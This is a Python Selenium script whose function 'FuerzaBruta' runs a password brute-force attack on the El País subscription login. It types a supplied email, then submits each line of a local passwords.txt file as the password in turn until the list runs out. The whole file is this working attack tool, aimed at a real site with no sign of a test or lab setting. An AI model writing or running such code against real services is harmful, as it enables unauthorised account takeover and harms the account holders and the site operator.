
from os import link
from bs4 import BeautifulSoup
from bs4.element import SoupStrainer
import requests
import pandas 
import re
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time
import csv
from datetime import date
import json
from selenium.webdriver.support.ui import Select

options= webdriver.ChromeOptions()
#options.add_argument('--headless')
#options.add_argument('--disable-gpu')
options.add_argument('start-maximized')
options.add_argument('--disable-extensions')

#driver_path='C:\\Users\\brian\\OneDrive\\Escritorio\\chromedriver.exe'
driver_path='/Users/brianignaciocastrofarias/Desktop/OneDrive/Escritorio/Trabajo/chromedriver'
driver=webdriver.Chrome(driver_path,chrome_options=options)


def FuerzaBruta(email):

    driver=webdriver.Chrome(driver_path,chrome_options=options)
    driver.get('https://elpais.com/subscriptions/#/sign-in?prod=REG5D&o=CABEP&backURL=https%3A%2F%2Fcincodias.elpais.com%2F%3Fevent_log%3Doklogin')
    time.sleep(3)
    try:
        element = WebDriverWait(driver, 15).until(
                        EC.element_to_be_clickable((By.XPATH,'/html/body/div[1]/div/div/div/div/div[2]/button[2]')))\
                        .click()
    except:
        None
    

    time.sleep(1)
    f = open ('/Users/brianignaciocastrofarias/Desktop/passwords.txt','r')
    mensaje = f.readlines()
    element = WebDriverWait(driver, 15).until(
                            EC.element_to_be_clickable((By.NAME,'subsEmail')))\
                            .send_keys(email)

    for i in mensaje:
        element = WebDriverWait(driver, 15).until(
                            EC.element_to_be_clickable((By.ID,'subsPassword')))\
                            .send_keys(Keys.COMMAND,'a')
        element = WebDriverWait(driver, 15).until(
                            EC.element_to_be_clickable((By.ID,'subsPassword')))\
                            .send_keys(Keys.BACKSPACE)
        element = WebDriverWait(driver, 15).until(
                            EC.element_to_be_clickable((By.ID,'subsPassword')))\
                            .send_keys(i.replace('\n',''))

        element = WebDriverWait(driver, 15).until(
                            EC.element_to_be_clickable((By.ID,'subsSignIn')))\
                            .click()
        time.sleep(10)
    time.sleep(15)
    driver.close()
    f.close()
    



